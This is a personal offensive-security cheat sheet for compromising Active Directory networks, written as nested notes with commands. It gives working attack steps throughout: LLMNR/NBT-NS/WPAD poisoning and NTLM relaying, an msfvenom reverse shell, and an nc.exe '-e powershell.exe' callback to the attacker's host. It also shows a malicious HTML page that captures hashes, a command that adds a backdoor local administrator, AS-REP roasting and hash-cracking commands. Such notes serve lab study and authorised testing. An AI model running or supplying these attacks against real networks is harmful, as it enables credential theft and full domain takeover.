AD Exploitation:
===============
Scenario:
	we are given an internal ip in a network or we hacked into their Wi-Fi, and we have to compromise the network.
Goal:
	1. Compromise a member of 'Domain Admins' group to complettely control every single computer in domain
	2. Compromise a Domain Controller and use it to modify all domain-joined computers
Basics:
	Read AD 101 Sheet
Initial Shell:
	NTLM Attacks:
		Basics:
			Read Windows Internals Sheet
		Relaying Attack:(aka NTLM Relay Attack)
			Basics/Working:(2 Steps)
				Step-1: MITM(Man In The Middle) against SMB/LDAP/etc protocols by abusing NR(Name Resolution) Protocols to gain Net-NTLM hashes:(2 Steps)
					Step-A: Abusing the following NR Protocols:
						Windows NR Protocols:
							Windows resolve a domain name in the following hiearchy:
								Search in C:/Windows/System32/Drivers/etc/hosts -> DNS(cache/server) -> Local LMHOST file -> LLMNR -> NBNS
							LLMNR:(Link-Local Multicast Name Resolution)
								Read Windows Internals Sheet
							NBT-NS:(NetBIOS Name Service)(aka NetBIOS)(aka NBNS)
								Read Windows Internals Sheet
						Linux NR Protocols:
							mDNS:(Multicast DNS)
								OSX and Linux zero-configuration implementations use mDNS to discover systems within a network.
					Step-B: MITM against the following protocols to gain NTLM(v1/v2) hashes:
						1. WPAD:(Web Proxy Automatic Discovery)
							Basics:								
								Organizations allow employees to access Internet through proxy servers to increase performance, ensure security and track traffic.Employees who connect to the corporate network need to know which proxy server they have to use without doing any configuration.
								By Default, browser is configured to automatically detect proxy settings. For that, it makes use of "WPAD protocol" to locate and download the "wpad.dat" from "WPAD Server"
								WPAD has 3 components:
									1. Server:
										It stores wpad.dat file
									2. Protocol:
										Allows auto discovery of web proxy config
										used in browsers
									3. wpad.dat:
										aka PAC(Proxy Auto-Config) file
										Its stored on WPAD server and contains proxy settings
							Exploitation Vector:
								In most organizations, a "WPAD Server" does not exist. So, when a user's system want "wpad.dat", a DNS request for the IP of “wpad.<domain>.com” is sent to DC and when no DNS record is returned, LLMNR and NBT-NS of user queries the network for "wpad.dat" file. To which, responder responds that "hey, i have wpad.dat, download it from my HTTP server" and giving our ip, and thus getting victim AUTHENCIATED to resonder's HTTP server and gaining his NTLMv2 hash.
								Further Exploitation:
									A. We can also attach a payload with "wpad.dat" to get shell.
									B. We can redirect the user to a malicious page which can be for:
										1. Phishing
										2. Download malware
						2. SMB:
							Basics:
								Read Active Information Gathering Sheet
							Exploitation Vector:
								Let's say, a user mistyped name of a share. Since that share dont really exists, the user_system failes to resolve name using DNS. So, LLMNR and NBT-NS of user queries the network for share, to which, responder responds that "hey, its me u are looking for" by spoofing share_name and giving our ip, and thus getting victim AUTHENCIATED to resonder's SMB server and gaining his NTLMv2 hash
						3. LDAP:
						4. Kerberos:
						5. MSSQL:
							Read in Sql Injection Sheet under MSSQL OOB Section
						6. HTTP:
							We can host a malicious webpage having:
								<img src="file://my_tun0/abcd/file.jpg">
							Using social engineering skills, we can make the victim open the webpage. Upon opening of webpage, we will get Net-NTLM hash.
							Explanation:
								Using "file://<ip>" schema is similiar to downloading file from a SMB server. Browser automatically authenciates in this case and sends Net-NTLM hash.
						7. HTTPS:
							Same as HTTP but with SSL layer enabled.
						8. DCE-RCP:
						9. DNS:			
				Step-2: Abusing the Net-NTLM hash:(2 Ways)
					A. Cracking Net-NTLM hash:
						Limitations:
							Password Policy of victim organization
							It hard to crack a 15-character password
					B. Relaying Net-NTLM hash:
						Relaying:
							Meaning => To Receive and Pass on information or a message
						Relaying a Hash v/s Passing a Hash:
							In a way, SMB Relays are the network version of Pass the Hash attacks.
						Types:
							Same Protcol relay on same machine:
								We relay hash back to same machine over the same protocol
								Examples:
									SMB to SMB relay on same machine:
										MS08-068 (aka SMB Credential Reflection vulnerability)
								"same protcol relay on same machine" is now Patched
							Cross Protcol relay on same machine:
								We relay hash back to same machine over the different protocol(Which uses NTLM Authenciation)
								Example:
									HTTP to SMB relay on same machine:
										MS16-075
								"cross protcol relay on same machine" Patched
							Same/Cross protocol relay over a network:
								We relay hash to some other machine in the network over the same/different protocol(Which uses NTLM Authenciation)
			Exploitation:(2 Types)
				A. Grabbing Net-NTLM hash and Cracking it:(2 Steps)
					1. Grabbing the Hash:(2 Tools)	
						A. Responder:
							A. Wrong sharename attack:(Attacking SMB)
								$ responder -I eth0 -bf
								Note:
									Read Basics above
							B. WPAD based attack:(Most Common)
								Getting NTLMv2 hash:
									responder -wFbf
								Getting shell using wpad.dat file and NTLMv2 hash:
									Edit responder.conf:
										[HTTP serve]
										Serve-Exe = On
										Serve-Html = On
									responder -I eth0 -rwFbf
										it will cause the victim to download malc.exe giving Bind Shell on port 140
									nc -nv <victim_ip> 140 
								Redirecting user to a malicious page and getting NTLMv2 hash:
								Note:
									Read Basics above
							C. MSSQL OOB Attack:
								Read in Sql Injection Sheet under MSSQL OOB Section
								Used in HTB::Querier,HTB::Sizzle
							D. Malicious WebPage:
								Host malc.html:
									<html>
									<head><title>Hello World</title></head>
									<body>
									<img src="file://my_tun0/abcd/file.jpg">
									</body>
									</html>
								$ responder.py -I interface -rdwFfb
								We will get Net-NTLM creds as soon as victim opens up malc.html
								Note:
									Read Basics above
							Note:
								To read more about Responder tool, see below
						Inveigh:(PowerShell Responder)
							Note:
								To read more about Inveigh tool, see below					
					2. Cracking the Hash:
						NTLMv1:
						Net-NTLMv2:
							john --format=netntlmv2 hash.txt
						NTLMv2-SSP:
							hashcat -m 5600 hashes.txt wordlist.txt
				B. Grabbing Net-NTLM Hash and Relaying it:(2 Steps)
					1. Analysing and poisoning network requests:
						Responder:
							Edit responder.conf:(To disable SMB and HTTP and LDAP server)
								SMB = Off
								HTTP = Off
								LDAP = Off
							$ responder -I eth0
							Note:
								To read more about Responder tool, see below
					2. Relay Attack:(3 Types)
						A. SMB Relay Attack:
							Requirements:
								SMB Signing needs to be disabled on victim(to which we are relaying Net-NTLM hash to) as SMB Signing protects against SMB Relaying
								Except of win_Server, every win os has SMB Signing disabled by default.
							Exploitation:(2 Steps)
								1. Finding targets with SMB Signing disabled:
									crackmapexec smb <cidr> --gen-relay-list targets.txt
								2. Relaying Hash:(4 Tools)
									A. MultiRelay.py:(part of Responder Toolkit)
										Best tool of all. Has a lot of meta commands.
										MultiRelay.py -t <ip> -u ALL => gives "MultiRelay Shell"
										Note:
											To read more about MultiRelay.py, see below
									B. ntlmrelayx.py:(Impacket)
										Dumping SAM/ntds.dit:
											Attacking a single target:
												ntlmrelayx.py -t <ip> -smb2support
											Attacking a single target:
												ntlmrelayx.py -tf targets.txt -smb2support
										Executing Commands on victim:
											ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
										Getting a Shell:(3 Ways)
											1. Using inbuilt way:(-i flag)
												it will give us a shell on 127.0.0.1:port
												$ ntlmrelayx.py -tf targets.txt -smb2support -i
												$ nc -nv 127.0.0.1 <port>
											2. Executing a payload using inbuilt way:(-e flag)	
												msfvenom -p windows/shell_reverse_tcp LHOST=my_tun0 LPORT=443 -f exe -o malc.exe
												ntlmrelayx.py -tf targets.txt -smb2support -e malc.exe
											3. Using -c flag:
												ntlmrelayx.py -tf targets.txt -smb2support -c "//my_tun0/nc.exe -e powershell.exe my_tun0 443"
										Note:
											To read more about ntlmrelayx.py, see below
									C. smbrelayx.py:(Impacket)
										smbrelayx.py -h <ip> -c "command"
										Note:
											To read more about smbrelayx.py, see below
									D. Inveigh-Relay:
						B. LDAP Relay Attack:
							Basics:
								LDAP is an interesting protocol because it is used to directly query the directory, which contains a lot of interesting information for an attacker. Even more interesting is that most of this information is by default readable by all accounts in the domain (including computer accounts)
							Requirements:
								LDAP signing must be disabled			
							Exploitation:(2 Steps)
								1. Finding targets with LDAP Signing disabled:
								2. Relaying Hash:(1 Tool)
									A. ntlmrelayx.py:(Impacket)
										ntlmrelayx.pty -t ldaps://<ip> -l loot 
										Note:
											To read more about ntlmrelayx.py, see below
						C. IMAP Relay Attack:
							Exploitation:
								Relaying Hash:
									A. ntlmrelayx.py:(Impacket)
										ntlmrelayx.pty -t imap://<ip> -l loot 
										Note:
											To read more about ntlmrelayx.py, see below
		DNS-Takeover Attack:
			Basics:
				we act like a DNS for IPV6 addresses (dns spoofing)
			Exploitation:(2 Steps)
				1. 
					mitm6:
						mitm6 -d /domain_name => sends reply
				2.	
					ntlmrelayx.py -6 -t ldaps://ip_of_dc -wh fakewpad.marvel.local -l lootme
		Explanation of Tools:
			Responder:(apt-get install responder)
				Basics:
					Responder is a LLMNR, NBT-NS and mDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication:
						Responder is a LLMNR, NBT-NS and mDNS poisoner:
							Responder is a "Poisoner" which means a tool that is used to perform Poisoning/Spoofing Attacks, i.e. to put false information into a network protocol.
							Responder is used to poison LLMNR, NBT-NS and mDNS protocols.
						Responder has built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server:
							Responder has fake Authenciation servers for HTTP/SMB/MSSQL/FTP/LDAP. These are needed to act like the real server, to gain NTLM(v1/v2) hashes from client(victim)
						Responder supports NTLMv1/NTLMv2/LMv2:
							Responder will let us capture NTLMv1/NTLMv2/LMv2 hashes
						Extended Security NTLMSSP and Basic HTTP authentication:
							Responder supports NTLM security features such as NTLMSSP and Basic HTTP authentication
					Configuration File:(/usr/share/responder/Responder.conf)
						Editing responder.conf:
							RespondTo = ip or range # can be specified via this way too
							On/Off servers:
								SMB = Off
					Note:
						Responder keep logs which may be important to us:
							responder-session.log
							analyse-session.log
							poisoners-session.log
				Flags:
					-I <interface> => interface
					-r => Enable answers for netbios wredir suffix queries
						Meaning:

					-d => Enable answers for netbios domain suffix queries
						Meaning:

					-b => Return Basic HTTP authentication
						This shows the Net-NTLM hash recieved
					-f => fingerprint OS
						This shows OS version
					Used in WPAD Attack:
						-w => start the wpad rouge proxy server.
							We act like the wpad server having wpad.dat file
							if we only use "-w" flag, we will get NTLM-SSP hash
						-F => force basic auth on wpad.dat file to steal Net-NTLMv2 hash by causing a "login prompt"(Not OPSEC safe)
							if we use "-wF", we will get us "cleartext password"
			Inveigh:
				Basics:
					Inveigh is powershell version of responder
			smbrelayx.py:(Impacket)
				Basics:
					We use it to relay the hash to some other service on the same machine.
				Usage:

					Flags:
						-h => host_ip (ip to relay to)
						-e malc.exe => payload
			ntlmrelayx.py:(Impacket)
				Basics:
					It allows multi-relay attacks, it means using just a single connection to attack several targets
					It is updated version of smbrelayx.py
					Advanatges:
						ntlmrelayx.py automatically dumps the SAM file after successfully relaying a request.
				Flags:
					Mentioning Target:
						-t scheme://ip:port => single target
							Example:
								smb://ip => same as ip
									-t <ip>
									-t smb://ip
								ldap://ip
								ldaps://ip
								imap://ip
						-tf => targets.txt => list of machines which have smb signing disabled
					-smb2support => support for SMBv2 protocol
					--socks => 
					--escalate-user => 
					-wh => wpad hostname to spoof
					IPv6:
						-6 => ipv6
					Dumping Data:
						-l => dump info	
							-l loot
					Command Execution:
						-i => interactive shell
							it will give us a shell on 127.0.0.1:port
							nc -nv 127.0.0.1 <port>
						-e => execute payload(.exe) 
							-e ./shell.exe
						-c => command 
							-c "net user user1234 pass1234 /add && net localgroup Administrators user1234 /add"
			MultiRelay.py:(/usr/share/responder/tools/MultiRelay.py)
				Basics:
					It is a part of Responder Toolkit.
					It is best tool out of all relaying tools.
					This is a framework which gives an interactive "multirelay shell" with many inbuilt meta-commands.
				Flags:
					-t <target_ip>
					-u <username>
						-u ALL => target all users
				Meta-Commands:		
					dump => dump SAM and print hashes
					regdump <key> => dump an HKLM registery key
					read path_to_file => read a file
					get path_to_file => download a file
					upload path_to_file => upload a file
					delete path_to_file => delete a file
					runas <command> => run a command as currently logged in user
					scan </24 or /16> => scan /24 or /16 subnet to find targets to pivot to
					pivot <ip> => pivot to another host
					mimi <command> => run a command on 64-bit mimikatz
					mimi32 <command> => run a command on 32-bit mimikatz
					lcmd <command> => run a command on local command and display results
			Inveigh-Relay:
			mitm6:(pip install mitm6)
				Basics:
				Flags:	
					-d => domain
	Domain Enumeration:
		LDAP:(389/636/3268/3269)
			Basics:
				Read Windows Internals Sheet
			Enumeration:
				ldapsearch:(CLI)
					ldapsearch -h ip => if we have creds
					ldapsearch -h ip -x => no creds req, it gives us domain
					Authenciated bind enumeration:
						ldapsearch -x -h ip -D 'domain\user' -w 'pass' -b " "
						error:
							bind must be completed => incorrect creds
					Unauthenciated bind enumeration:
						ldapsearch -x -h ip -D 'domain\user' -b " "
					Extracting info:
						-b "CN=Users,DC=,DC=" => users
						CN=computers
						CN=Domain Admins
						CN=Administrators
						CN=Remote Desktop Users
					ldapsearch_options query filter
						query:
							'(ObjectClass=Person)'
						Filter:
							SAMAccountName
					x => simple auth
					h => host ip
					D => domain_name\Username
					w => password
					b => base dn
						-b "DC=htb,DC=local" #htb.local
				jxplorer:(GUI)
					Installation:
						apt-get install jxplorer
					Usage:
						Enter host: <ip>
						Enter base DN: DC=domain, DC=local
		RPC:(111/135/593)
			Basics:
				Read Windows Internals Sheet
			Pentesting:
				MSRPC Protocol:(TCP/135)
					Basics:
						Read Above
					Enumeration:
						nmap -sV -script msrpc-enum <ip>
						Connecting to RPC share to query RPC Network protocols:
							samrdump.py:(Impacket)
								Basics:
									samrdump.py is used to retrieve info about target from SAM using MS-SAMR.
									It lists out all the system shares, user accounts, and other useful information.
								Usage:
									samrdump.py [domain]/[user]:[Password/Password Hash]@[Target IP Address]
									FLags:
										-p => port
							rpcclient:
								Basics:
									It is a utility initially developed to test MS-RPC functionality in Samba(part of MS) itself by querying MSRPC over TCP/135. It is used to manage MSRPC from unix workstations.
									It gives rpc shell
									Meta-Commands:
										Types:
											LSARPC:(LSA Remote Protocol)
											LSARPC-DS:
											REG:
											SRVSVC:(Server Service Remote Protocol)
											SAMR:(SAM Remote Protocol)
											SPOOLSS:(Spool Subsystem)
											NETLOGON:
											FSRVP:
										Note:
											Read RPC Applications Section to know more
								Usage:
									rpcclient -U '' -N ip => anonymous login (aka null session)
									rpcclient -U "" -N ip => anonymous login
									rpcclient -U "domain.local/username" -N ip => Domain User login
									rpcclient -U "" -N ip -c "getusername;quit" => passing metacommand as an argument
									Meta-Commands:
										Most used:
											querydominfo => gives no of users
											enumdomusers => gives a list of users
												creating users.txt from output:
													Copy output to temp.txt
													cat temp.txt | awk -F\[ '{print $2}' | awk -F \] '{print $1}' > users.txt
											querydispinfo => gives info about users, sometimes we find deafult password in comments too.
												This was found useful in HTB::Resolute
											enumprinters => show printers info and it may have user password
												used in HTB::Fuse	
									Flags:
										-U => --user="" => Username or username%password
										-I => ip
										-p => port
										-c => --command=<> => command string
										-N => Null Session(do not ask for a password)
								Note:
									To know more about using rpcclient:(Read this while pentesting)
										https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html
							Note:
								Unfortunately, we cannot use rpcclient commands like enumdomusers/querydispinfo on every system. In such cases, try RID Cycling.
						RID Cycling:(used in HTB::Hiest)
							Basics:
								A SID(Security Identifier) is a unique value of variable length that is used to identify an object in Windows operating systems.
									Example => S-1-5-21-4254423774-1266059056-3197185112-<RID value>
								The last part of a SID is RID:
									RID(relative identifier) is a number of variable length that is assigned to objects when they are created.
									There are two sets of RIDS:
										500-1000 for System created users and groups.
										1000-10000 for Domain created users and groups.
							To find SID of an account:(SID Lookup)
								rpcclient>lookupnames <account_name>
									If account name is valid => we will get SID
										Accounts which are always valid:
											Administrator
											krbtgt
									If account name is invalid => we will get an error "result was NT_STATUS_NONE_MAPPED"
							To find Account Name using SID:(Reverse SID Lookup)
								rpcclient:
									rpcclient>lookupsids <SID value>
									Automating it:
										for i in {500..10000}; do rpcclient -U 'user%pass' <ip> -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v unknown; done
								lookupsids.py:(Impacket)
									Basics:
										It can be used to enumerate both local and domain users.
									Usage:
										lookupsid.py [domain]/[user]:[password/hash]@[Target IP Address]
							ridenum:
								Basics:
									Rid Enum is a RID cycling attack that attempts to enumerate user accounts through null sessions and the SID to RID enum. If you specify a password file, it will automatically attempt to brute force the user accounts when its finished enumerating.
								Usage:
									./rid_enum.py <server_ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
									Flags:
				Exposed RPC Services:
					RPCBind:(aka Portmapper)(TCP/111)
						Basics:
							Read Endpoint Mapper Section of RPC Components Section
						Enumeration:
							Nmap:
								nmap -p 111 --script=rpcinfo <ip>
							RPCInfo:
								Basics:
								Usage:
									rpcinfo -p <ip> => 
									Flags:
										-p => 
							RPCBind:(Binary)
								Basics:
								Usage:
									rpcbind -p <ip> => list all services running on port 111
									Flags:
										-p => 
					RPC Endpoint Mapper:(TCP/593)(used in HTB::APT)
						Basics:
							Read Windows Internals Sheet
						Doubt:
							It also works on TCP port 135, but nmap dont show it. So how to know if its working on port 135?
								Hit and trial. If TCP port 135 is open and rpcclient(tool for MSRPC) is showing 'Connection Issues', Then it means that we have 'RPC endpoint mapper' on TCP port 135.
						Enumeration:
							http://etutorials.org/Networking/network+security+assessment/Chapter+9.+Assessing+Windows+Networking+Services/9.2+Microsoft+RPC+Services/
							Enumeration Roadmap:
								Step-1: rpcdump.py
									gives BINDING
								Step-2: rpcmap.py
									takes BINDING as an argument
									gives UUID
								Step-3: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4
									cross check UUID against it
									gives name of interface
								Step-4: Find vulnerability for the interface
							rpcdump.exe:(By Todd Sabin)
								Basics:
									https://resources.oreilly.com/examples/9780596006112/blob/8c67185a96e324f54b149ba5f7269ea6c4de6ab7/tools/rpctools/rpcdump/rpcdump.c
									It works over the following 4 protocol sequences:
										ncacn_ip_tcp
										ncadg_ip_udp
										ncacn_np
										ncacn_http
								Usage:
									rpcdump <flags> <ip>
									Flags:
										-v => verbose
										-p <sequence> => specify a particular protocol sequence(Default => all 4 primary protocol sequences)
							rpcdump.py:(Impacket)
								Basics:	
									This will give us endpoints, bindings, protocol sequences and UUID.
									It is kinda linke rpcdump.exe
								Usage:
									rpcdump.py -p 135 [domain]/[user]:[Password/Password Hash]@[Target IP Address]
									rpcdump.py -port 135 192.165.89.98
									rpcdump.py -port 135 '192.165.89.98'
									FLags:
										-p => -port => port
								Note:
									We will use bindings provided by it as a paramater to rpcmap.py
							rpcmap.py:(Impacket)
								Basics:	
									It scans for listening DCE/RPC interfaces. This binds to the MGMT interface and gets a list of interface UUIDs. If the MGMT interface is not available, it takes a list of interface UUIDs seen in the wild and tries to bind to each interface.
									We will use bindings provided by rpcdump.py as a paramater to rpcmap.py
									It provides list of currently listening interfaces accessible over TCP/IP
								Usage:
									rpcmap.py 'binding' <flags>
									rpcmap.py 'ncacn_ip_tcp:<ip>' -brute-uuid => provides UUID
									rpcmap.py 'binding' -brute-opnums -opnum-max 5 => To determine which methods of a interface’s methods are accessible
										binding => RPC_network_protocol:<ip>[port]
										Flags:
											-brute-opnums => Bruteforce opnums for found UUIDs
											-brute-uuid => Bruteforce UUIDs even if MGMT interface is available
											-brute-versions => Bruteforce major versions of found UUIDs
											-opnum-max x => Bruteforce opnums from 0 to x (default 64)
											-version-max x => Bruteforce versions from 0 to x (default 64)
											-auth-level x => MS-RPCE auth level, from 1 to 6 (default 6)
											-uuid UUID => Test only this UUID
								Note:
									This will provides list of currently listening interfaces accessible over TCP/IP along with their UUIDs. We can reverse check these UUIDs against this list to get Name of Interface:
										https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4
									If we are lucky, we can find some vulnerability of the interface, like in case of HTB::APT
		Kerberos:(TCP/88)
			Basics:
				Read Kerberos Section in Windows Internals Sheet
			Attacks:
				A. Kerberos Bruteforce:
					Read in "Kerberos Related Attacks" Section of "Kerberos Related Attacks" Section under privesc
				B. AS-REPRoasting:
					Basics:
						Pre-authentication is the first step in Kerberos authentication, and is designed to prevent brute-force password guessing attacks. preauthentication is required by default in Active Directory.  
						AS-REP Roasting is an attack against Kerberos for user accounts that do not require preauthentication, ie, the accounts which have "DONT_REQ_PREAUTH" set to them. If preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline. 
					Requirements:
						List of users in a domain
					Exploitation:(2 Steps)
						Step-1: Grabbing hashes:
							Note:
								We may have kerberos open locally, in that case we can either port forward or we can exploit it locally as explained under 'Locally' Section.
							Locally:(On Victim)
								Using Rubeus.exe:
									Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat
										tries asrep roast against every user and saves hashes in hashes.txt in hashcat format
									Note:
										To know more about Rubeus, Read Rubeus Section
							Remotely:(Via Kali)
								GetNPUsers.py:(Impacket)
									Basics:
										It is used for ASREPRoast Attack.
									Usage:
										GetNPUsers.py -no-pass -dc-ip 10.10.10.192 -usersfile users.txt domain_name/ -format john -outputfile hashes
											performs ASREPRoast for specified users (no credentials required)
										GetNPUsers.py domain_name.local/user_name:password -request -format -format john -outputfile hashes
											performs ASREPRoast for all domain users (credentials required)
										Flags:
											-dc-ip => Ip of DC
											-usersfile => users.txt
											-format {hashcat(default), john} => Hash Format
											-outfile => output.txt
											-no-pass => dont ask for password
											-request => Request TGT for all users and outpur them in specified format
									Note:
										users.txt should contain only username not domain_name.local/username
						Step-2: Cracking as-rep roast hashes:(2 Ways)
							A. hashcat -m 18200 hash.txt rockyou.txt
							B. john --format=krb5asrep --wordlist=rockyou.txt hash.txt
Privilege Escalation:
	Enumeration:
		Note:
			In HTB, we have just one box and we assume it as domain/DC. But its not real life as in real life, we have:
				A forest, having many trees and each of those trees have multiple domains with each domain having a primary DC and many secondary DC's and many other computer devices, each one of them having both unique and shared users and groups. So, Here, i will make notes for Real-Life AD pentesting.
		Methodology:
			Follow the following hiearchy:
				1. Do manual AD enumeration 
				2. Run windows privsec scripts
				3. Run powerview 
				4. Run bloodhound
		Manual Enumeration:(2 Ways)
			A. Traditional Approach:
				Using net.exe:
					net view => shows a list of computers and network devices on the network
					net view \\computer_name => shows shares on the specified computer
					net user => show user accounts on the host device
					net user /domain => shows user accounts for the whole domain along with the domain name
						Note => most times the usernames are made in a way that they define role of user in domain ex: jeff_admin
					net user user_name /domain => shows info about the user related to domain
					net group /domain => shows groups in a domain
			B. Mordern Approach:(2 Ways)
				A. Using Get-ADUser:
					Basics:	
						Note:
							cmdlets like Get-ADUser are only installed by default on domain controllers and while they may be installed on Windows workstations from Windows 7 and up, they require administrative privileges to use.
					Usage:
						Get-NetDomain => info about current domain
						Get-NetDomain -domain 'domain_name'
						Get-DomainSID => gives SID for domain
						Get-NetDomainController => info about DC
						Get-UserProperty –Properties pwdlastset => info about property
						Get-NetComputer => list all computers in current domain
						Get-NetComputer -Ping => show live hosts
						Get-NetGroup
						Get-NetGroupMember -GroupName "Domain Admins"
				B. Using ADSI:(Active Directory Service Interfaces)
					Basics:
					Usage:
						Developing a script to utilize ADSI:
							Basics:
								This script will query the network for the name of the Primary domain controller emulator and the domain, search Active Directory and filter the output to display user accounts, and then clean up the output for readability.
							Script to enumerate all users:(Main Script)
								Script:
									$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
									$PDC = ($domainObj.PdcRoleOwner).Name
									$SearchString = "LDAP://"
									$SearchString += $PDC + "/"
									$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
									$SearchString += $DistinguishedName
									$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
									$objDomain = New-Object System.DirectoryServices.DirectoryEntry
									$Searcher.SearchRoot = $objDomain
									$Searcher.filter="samAccountType=805306368"
									$Result = $Searcher.FindAll()
									Foreach($obj in $Result)
									{
										Foreach($prop in $obj.Properties)
										{
											$prop
										}
										Write-Host "------------------------"
									}					
								Explanation of script:
									$domainObj contains output of:
										[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() => this gives domain_name, name of dc
									$PDC contains hostname of dc having PdcRoleOwner property
									$DistinguishedName is DN
										$DistinguishedName = DC=domain,DC=com
									$SearchString is ldap://hostname:port/DistinguishedName
									$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
										$Searcher is Usage of DirectorySearcher() class, which uses LDAP path ($SearchString)
									$Searcher.SearchRoot = $objDomain
										It shows that the search root of $Searcher starts from $objDomain
									Using Filter:
										without them, the script will show every object
										$Searcher.filter="samAccountType=805306368":
											we set filter via samAccountType property having value of 805306368 => this will filter all domain users
									FindAll() => to conduct a search and find all results
									using two foreach we applied a double loop to print all properties of users along with usernames
							Script to enumerate all groups:
								Script:
									$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
									$PDC = ($domainObj.PdcRoleOwner).Name
									$SearchString = "LDAP://"
									$SearchString += $PDC + "/"
									$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
									$SearchString += $DistinguishedName
									$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
									$objDomain = New-Object System.DirectoryServices.DirectoryEntry
									$Searcher.SearchRoot = $objDomain
									$Searcher.filter="(objectClass=Group)"
									$Result = $Searcher.FindAll()
									Foreach($obj in $Result)
									{
										$obj.Properties.name
									}			
								Explanation of script:
									For the left out explanation, read Explanation for Script to enumerate all users
									The filter attribute helps to filter the output to just contain groups
							Script to enumerate nested groups:
								Nested Groups are those which contains groups inside them along with users
		Automated Enumeration:
			A. If we have Shell:
				1. PowerView.ps1:(https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
					Basics:	
						This script is full of great modules for AD
					Usage:
						powershell -ep bypass
						Import-Module ./powerview.ps1
						module-name => list modules
						Modules for Enumeration:
							Get-NetLoggedon -ComputerName name:
								As explained earlier, we can get list of computers joined to domain via manual privesc. Once done, we can use this command with the computer_name to show currently loggedin users in that computer
							See GITHUB page for more options
						Modules for Exploitation:
							Note:
								Bloodhound uses powerview modules to suggest privesc path
				2. Bloodhound:(apt-get install bloodhound)
					Basics:	
						It is a tool to visualize all the data in AD and provides method for privesc(via PowerView Modules) on basis of data collected
					Usage:
						Step-1: Using Collectors to collect the Data:
							Basics:
								In order to use Bloodhound, we need to provide data which we collect using Collectors
								Download:
									https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
							Collecting the Data:
								A. Locally:(On Victim)
									Using sharphound.ps1:
										transfer it to victim
										PS> PowerShell -Exec Bypass
										PS> . .\sharphound.ps1
										PS> invoke-bloodhound -collectionmethod All -domain domainname -zipfilename file.zip => it will create file.zip
										Flags:(For invoke-bloodhound)
											-ldappassword
											-ldapusername
											https://github.com/BloodHoundAD/BloodHound/blob/master/docs/data-collection/sharphound-all-flags.rst
										transfer file.zip to kali
									Using SharpHound.exe:
										transfer it to victim
										CMD> SharpHound.exe --collectionmethod All -d domainname => it will create yyyyMMddhhmmss_BloodHound.zip
									Using AzureHound.ps1:
								B. Remotely:(Via Kali)
									Benefits of Remote Way over Local Way:
										No file transfer
									Using bloodhound-python:
										Installation:
											pip install bloodhound
										Usage:
											bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c ALL -ns 10.10.10.30
											bloodhound-python -d domain.local -u user -p 'pass' -gc pathfinder.megacorp.local  -c ALL -ns <ip>
												-d => domain to query
												-dc dc_domain_name => Override which DC to query
												-gc gc_domain_name => Override which GC to query
												-ns ip => Alternative name server to use for queries
											This will give us many .json files
											zip file.zip *.json => makes file.zip
											drag and drop file.zip in bloodhound to import all files in one shot
						Step-2: Map out the data using Bloodhound:
							Requirement:
								We need to setup neo4j before starting it:
									$ neo4j console
										This will start neo4j at http://localhost:7474/
											deafult creds: neo4j:neo4j
											change password
												My cred => neo4j:kali
							Usage:
								bloodhound => To start bloodhound
								To load data in bloodhound:
									By default, SharpHound and AzureHound will generate several JSON files and place them into one zip. Drag and drop that zip into the BloodHound GUI, and BloodHound will import that data.
								Once data is loaded:
									We can select various inbuilt queries, of which some very useful ones are:
										Find Shortest Paths to High value Targets
										Find Shortest paths to Domain Admins
										Find Principles with DCSync Rights
										Find all Domain Admins
			B. If we have Pass/Hash:
				1. Bloodhound-python:
					Read Usage Section Under Bloodhound above
				2. GetADUsers.py:(Impacket)
					Basics:
						User Enumeration
					Usage:
						GetADUsers.py -all -dc-ip ip domain.local/username:password
						Flags:
	Privesc Attacks:
		Kerberos Related Attacks:(TCP/88)
			Type-1: Attacking Kerberos Protocol:
				A. Kerberos Bruteforce:(Used in HTB::Active/almost every box which was AD)
					Basics:
						Its a type of password spray attack, in which we supply a list of users and passwords/hashes and find any known creds which can be later on used for authenticated enumeration or getting shell, etc.
						Note:
							This attack vector can be used both for privesc and for initial attack.
					Types:(2)
						1. Bruteforcing users using passwords:
							Kerbrute:(https://github.com/ropnop/kerbrute)
								Basics:
									Kerbrute is used to bruteforce user passwords or names, or password spray using Kerberos
									Working:
										Modes:(3)
											A. UserEnum:
												To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. This generates a Windows event ID 4768 if Kerberos logging is enabled.
											B. BruteUser:
												Only run this if you are sure there is no lockout policy as this will increment the failed login count and lock out accounts.
												This will generate both event IDs 4768 - A Kerberos authentication ticket (TGT) was requested and 4771 - Kerberos pre-authentication failed.
											C. PasswordSpray:
												Only run this if you are sure there is no lockout policy as this will increment the failed login count and lock out accounts.
												This will generate both event IDs 4768 - A Kerberos authentication ticket (TGT) was requested and 4771 - Kerberos pre-authentication failed.
									Important:
										We are using 'kerbrute', not 'kerbrute.py'. Kerbrute.py has functionality limited to bruteforcing users only, is written in python and is provided by Impacket.
